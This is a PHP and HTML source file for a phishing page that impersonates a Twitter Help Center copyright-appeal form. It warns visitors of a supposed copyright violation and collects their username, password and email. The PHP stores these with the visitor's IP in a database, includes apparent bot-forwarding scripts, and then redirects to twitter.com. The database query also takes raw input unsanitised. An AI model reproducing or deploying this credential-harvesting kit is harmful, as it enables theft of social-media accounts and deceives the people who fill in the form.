<?php 
include ("app/config.php");
include ("app/database/router.php");
$ip = $_SERVER['REMOTE_ADDR'];
if ($_POST) {
  $username=$_POST['user'];
  $pass=$_POST['pass'];
  $mail=$_POST['mail'];
  include ("app/bot/value1.php");
  include ("app/bot/value2.php");
  $sqleayazmaverileriste = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$pass."','Null','".$mail."','Null','Null','".$ip."',current_timestamp())");
  header("Location:https://www.twitter.com/");
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Twitter Copyright</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="icon" type="image/png" href="https://imgyukle.com/f/2022/04/22/RaLKfS.png">
<style>
body {
  overflow: auto;
}
.spex {
    font-family: Helvetica Neue LT,Helvetica Neue,-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;
    font-weight: 700;
    font-size: 1.2rem;
    line-height: 1.2rem;
    letter-spacing: 0;
} 
.spex2 {
    font-family: Helvetica Neue LT,Helvetica Neue,-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;
    font-weight: 700;
    font-size: 32px;
    line-height: 36px;
    letter-spacing: 0;
}
.spexp {
    font-family: Helvetica Neue LT,Helvetica Neue,-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;
    font-weight: 400;
    font-size: 19px;
    line-height: 28px;
    letter-spacing: .12px;
}
.spex-btn {
  padding: 5px 15px;
  border: none;
  outline: none;
  background: #add8e6;
  border-radius: 20px;
  width: 180px;
  color: black;
  box-shadow: inset -6px -6px 25px 0 rgba(205, 177, 255, 0.5),
    inset 6px 6px 25px 0 rgba(0, 0, 0, 0.1);
  transition: 0.4s;
}
.spex-btn-sub {
  width: 140px;
  height: 45px;
  font-family: 'Roboto', sans-serif;
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: 2.5px;
  font-weight: 500;
  color: #000;
  background-color: #add8e6;
  border: none;
  border-radius: 45px;
  box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.1);
  transition: all 0.3s ease 0s;
  cursor: pointer;
  outline: none;
}
.spex-btn-sub:hover {
  background-color: #add8e6;
  box-shadow: 0px 15px 20px rgba(46, 229, 157, 0.4);
  color: #fff;
  transform: translateY(-7px);
}
</style>
</head>
<body>
<nav
  class="nav">
  <div class="container" id="Home">
    <br><br>
      <img src="https://imgyukle.com/f/2022/04/22/RaLKfS.png" width="45" style="margin-bottom: 15px;"> 
      <b class="spex2">Twitter Help Center</b>
   </div>
</nav>
<br>
<div class="container">
  <div class="row">
    <center>
   <div class="card" style="width: 375px;">
       <div class="card-body" style="height: 500px;">
        <p class="spexp">If you have been redirected to this page<br> it means that you have violated twitter copyrights. If you want to appeal this violation, fill out the form below.</p>
        <br>
        <form method="POST">
        <input type="text" name="user" class="input-group-text" placeholder="Username" required><br>
        <input type="password" name="pass" class="input-group-text" placeholder="Password" required><br>
        <input type="email" name="mail" class="input-group-text" placeholder="E-Mail" required><br>
        <input type="submit" name="submit" class="spex-btn-sub" value="Submit"><br>
      </form>
</div></div></center>
</div>
</div>
</div>
<br><br>
<br><br><br>
<br>
<footer style="background-color: #14171a; height: 50px;">
<center>
<br>
<p style="flex-grow: unset; color: whitesmoke;">© 2022 Twitter İnc.</p>
</center>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
</body>
</html>